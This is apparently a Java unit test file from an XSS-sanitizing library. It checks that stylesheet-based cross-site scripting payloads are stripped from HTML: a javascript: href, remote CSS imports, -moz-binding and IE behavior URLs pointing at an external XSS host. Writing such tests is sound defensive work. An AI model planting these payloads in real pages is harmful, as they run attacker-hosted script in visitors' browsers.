/**
 * Copyright 2007 Gerard Toonstra
 * 
 * Licensed under the terms of the Apache Software License v2
 *
 * This file is part of the XSS Protect library
 */

package com.blogspot.radialmind.xss.html;

import com.blogspot.radialmind.BaseTestCase;

// Verified vulnerability in :
// 		Firefox 2.0		not vulnerable
//
// Needs checking in IE6.0 

public class StyleSheetTest extends BaseTestCase {
	String styleSheet = "<html><head><title>test</title><link rel=\"stylesheet\" href=\"javascript:alert('XSS');\"></head><body></body></html>";
	String remoteStyle1 = "<html><head><title>test</title><link rel=\"stylesheet\" href=\"http://ha.ckers.org/xss.css\"></head><body></body></html>";
	String remoteStyle2 = "<html><head><title>test</title><style>@import'http://ha.ckers.org/xss.css';</style></head><body></body></html>";
	String remoteStyle3 = "<html><head><title>test</title><meta http-equiv=\"Link\" content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\"></head><body></body></html>";
	String remoteStyle4 = "<html><head><title>test</title><style>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</style></head><body></body></html>";
	String xssStyle = "<html><head><title>test</title></head><body><xss style=\"behavior: url(http://ha.ckers.org/xss.htc);\"></body></html>";
	
	public void testStyleSheet() {
		testExecute(styleSheet, "<html><head><title>test</title></head><body></body></html>" );
	}
	
	public void testRemoteStyle1() {		
		testExecute(remoteStyle1, "<html><head><title>test</title></head><body></body></html>" );
	}
	
	public void testRemoteStyle2() {		
		testExecute(remoteStyle2, "<html><head><title>test</title></head><body></body></html>" );
	}
	
	public void testRemoteStyle3() {		
		testExecute(remoteStyle3, "<html><head><title>test</title></head><body></body></html>" );
	}
	
	public void testRemoteStyle4() {
		testExecute(remoteStyle4, "<html><head><title>test</title></head><body></body></html>" );
	}
	
	public void testXssStyle() {		
		testExecute(xssStyle, "<html><head><title>test</title></head><body><xss></xss></body></html>" );
	}
}
